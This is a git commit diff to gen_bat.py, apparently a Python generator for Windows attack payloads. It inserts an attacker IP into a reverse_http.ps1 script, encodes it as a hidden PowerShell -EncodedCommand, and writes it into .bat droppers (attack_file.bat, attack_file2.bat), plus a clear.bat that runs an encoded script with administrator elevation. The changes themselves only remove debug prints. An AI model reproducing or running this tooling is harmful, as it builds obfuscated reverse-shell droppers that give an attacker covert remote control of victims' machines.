cf3c9068682f9576197280a078eb86dd5a40bbe7
pigxbun <68627116+pigxbun@users.noreply.github.com>
2021-05-05 22:23:40 +0800

    gen

--- gen_bat.py
+++ gen_bat.py
@@ -7,12 +7,10 @@ print('The ip adress of the attacker: '+ip)
 with open('reverse_http.ps1') as f:
     file2 = f.read()
     file2 = file2.replace('----SERVERIP----', ip)
-    print(file2)
     file2 = 'powershell.exe -WindowStyle Hidden  -EncodedCommand ' + \
         base64.b64encode(file2.encode("UTF-16LE")).decode("UTF-8")
 file1 = 'Out-File -FilePath C:/Users/attack_file2.bat -InputObject "' + \
     file2+'" -Encoding ASCII\n'
-print(file2)
 with open('attack_file1.ps1') as f:
     file1 += f.read()
 with open('attack_file.bat', 'w') as f:
@@ -23,5 +21,3 @@ with open('clear.ps1', encoding="utf-8") as f:
     with open('clear.bat', 'w') as f2:
         f2.write("Powershell -Command Start-Process powershell -ArgumentList '-EncodedCommand " +
                  base64.b64encode(clear.encode("UTF-16LE")).decode("UTF-8")+"' -Verb runAs")
-        # f2.write('powershell.exe -EncodedCommand ' +
-        #          base64.b64encode(clear.encode("UTF-16LE")).decode("UTF-8"))
